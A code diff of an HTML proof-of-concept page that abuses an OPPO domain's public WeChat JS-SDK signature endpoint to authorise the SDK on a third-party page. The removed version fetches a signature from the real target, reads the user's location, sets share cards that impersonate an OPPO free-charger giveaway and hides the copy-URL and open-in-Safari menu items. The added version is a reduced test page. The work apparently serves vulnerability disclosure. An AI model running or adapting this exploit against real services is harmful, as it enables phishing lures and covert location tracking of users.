@@ -1,139 +1,38 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>JSSDK PoC</title>
-  <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
-  <style>
-    body { font-family: monospace; padding: 16px; background: #0d1117; color: #c9d1d9; }
-    h3 { color: #58a6ff; }
-    .item { margin: 6px 0; padding: 8px 12px; border-radius: 6px; background: #161b22; border-left: 3px solid #30363d; }
-    .ok  { border-left-color: #3fb950; color: #3fb950; }
-    .err { border-left-color: #f85149; color: #f85149; }
-    .info{ border-left-color: #58a6ff; color: #58a6ff; }
-    .warn{ border-left-color: #d29922; color: #d29922; }
-    pre  { background:#161b22; padding:12px; border-radius:6px; overflow-x:auto; font-size:12px; color:#c9d1d9; }
-  </style>
+    <meta charset="utf-8">
+    <title>JSAPI Signature PoC</title>
+    <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
 </head>
 <body>
-  <h3>🔬 WeChat JS-SDK PoC — supervooc.oppo.cn</h3>
-  <div id="log"></div>
+<h1>JS-SDK Signature Test</h1>
+<p>签名时使用的URL: <code id="signedUrl"></code></p>
+<p>当前实际URL: <code id="currentUrl"></code></p>
+<script>
+    // 将你在请求接口时使用的 url 参数值硬编码在这里，方便肉眼比对
+    const SIGNED_URL = "https://yourname.github.io/jsapi-poc/";
+    document.getElementById('signedUrl').textContent = SIGNED_URL;
+    document.getElementById('currentUrl').textContent = location.href.split('#')[0];
 
-  <script>
-    const TARGET = 'https://supervooc.oppo.cn/pp/api/public/wxChatScan';
-    const pageUrl = location.href.split('#')[0];
-
-    function log(msg, type='info') {
-      const d = document.createElement('div');
-      d.className = 'item ' + type;
-      d.innerHTML = msg;
-      document.getElementById('log').appendChild(d);
-    }
-
-    log('📡 目标接口: ' + TARGET, 'info');
-    log('🌐 当前页面: ' + pageUrl, 'info');
-    log('⏳ 正在请求签名...', 'warn');
-
-    fetch(TARGET, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: 'url=' + encodeURIComponent(pageUrl) + '&type=3'
-    })
-    .then(r => r.json())
-    .then(res => {
-      if (!res.data) { log('❌ 接口返回异常: ' + JSON.stringify(res), 'err'); return; }
-      const d = res.data;
-
-      log('✅ 签名获取成功', 'ok');
-      log('<pre>'
-        + 'appId    : ' + d.appId + '\n'
-        + 'timestamp: ' + d.timestamp + '\n'
-        + 'nonceStr : ' + d.nonceStr + '\n'
-        + 'signature: ' + d.signature
-        + '</pre>', 'info');
-
-      wx.config({
-        debug: false,
-        appId:     d.appId,
-        timestamp: d.timestamp,
-        nonceStr:  d.nonceStr,
-        signature: d.signature,
-        jsApiList: [
-          'updateAppMessageShareData',
-          'onMenuShareTimeline',
-          'onMenuShareAppMessage',
-          'getNetworkType',
-          'getLocation',
-          'scanQRCode',
-          'chooseImage',
-          'openLocation',
-          'closeWindow',
-          'hideMenuItems',
-          'showMenuItems'
-        ]
-      });
-
-      wx.ready(function () {
-        log('✅ <b>wx.ready() 触发 — 签名在第三方域名验证通过</b>', 'ok');
-
-        // ── 1. 网络类型（已知可用）──────────────────────────
-        wx.getNetworkType({
-          success: function(r) {
-            log('✅ getNetworkType: ' + r.networkType + ' (simtype:' + r.simtype + ')', 'ok');
-          },
-          fail: function(r) { log('❌ getNetworkType: ' + r.errMsg, 'err'); }
-        });
-
-        // ── 2. 自定义分享（好友）────────────────────────────
-        wx.updateAppMessageShareData({
-          title:  'OPPO官方活动：领取免费SuperVOOC充电器',
-          desc:   '限时免费领取，点击参与活动',
-          link:   pageUrl,
-          imgUrl: 'https://supervooc.oppo.cn/favicon.ico',
-          success: function()  { log('✅ updateAppMessageShareData: 分享卡片设置成功', 'ok'); },
-          fail:    function(r) { log('❌ updateAppMessageShareData: ' + r.errMsg, 'err'); }
-        });
-
-        // ── 3. 自定义分享（朋友圈）──────────────────────────
-        wx.onMenuShareTimeline({
-          title:  'OPPO SuperVOOC 官方活动',
-          link:   pageUrl,
-          imgUrl: 'https://supervooc.oppo.cn/favicon.ico',
-          success: function()  { log('✅ onMenuShareTimeline: 朋友圈分享设置成功', 'ok'); },
-          fail:    function(r) { log('❌ onMenuShareTimeline: ' + r.errMsg, 'err'); }
-        });
-
-        // ── 4. 地理位置 ──────────────────────────────────────
-        wx.getLocation({
-          type: 'wgs84',
-          success: function(r) {
-            log('✅ getLocation: lat=' + r.latitude + ' lng=' + r.longitude, 'ok');
-          },
-          fail: function(r) { log('❌ getLocation: ' + r.errMsg, 'err'); }
-        });
-
-        // ── 5. 扫码 ──────────────────────────────────────────
-        // 注意：scanQRCode 需用户手动触发，此处仅测试接口是否可调用
-        wx.scanQRCode({ needResult: 1, scanType: ['qrCode'] });
-
-        // ── 6. 隐藏菜单项 ────────────────────────────────────
-        wx.hideMenuItems({
-          menuList: ['menuItem:copyUrl', 'menuItem:openWithSafari'],
-          success: function()  { log('✅ hideMenuItems: 菜单隐藏成功', 'ok'); },
-          fail:    function(r) { log('❌ hideMenuItems: ' + r.errMsg, 'err'); }
-        });
-
-      });
-
-      wx.error(function(r) {
-        log('❌ wx.error: ' + r.errMsg, 'err');
-      });
-
-    })
-    .catch(e => {
-      log('❌ Fetch 失败: ' + e.message, 'err');
+    wx.config({
+        debug: true, // 必须开启，错误信息会以弹窗形式直接显示
+        appId: '<从响应中获取的 appId>',
+        timestamp: <从响应中获取的 timestamp>, // 数字，不要加引号
+        nonceStr: '<从响应中获取的 nonceStr>',
+        signature: '<从响应中获取的 signature>',
+        jsApiList: ['getLocation', 'chooseImage', 'scanQRCode']
     });
-  </script>
+
+    wx.ready(function() {
+        console.log('✅ wx.config 校验通过，签名在 GitHub Pages 域上生效');
+        // 可选：进一步调用高危接口作为危害证明
+        // wx.getLocation({ type: 'wgs84', success: res => console.log(res) });
+    });
+
+    wx.error(function(res) {
+        console.error('❌ wx.config 校验失败', res);
+    });
+</script>
 </body>
 </html>
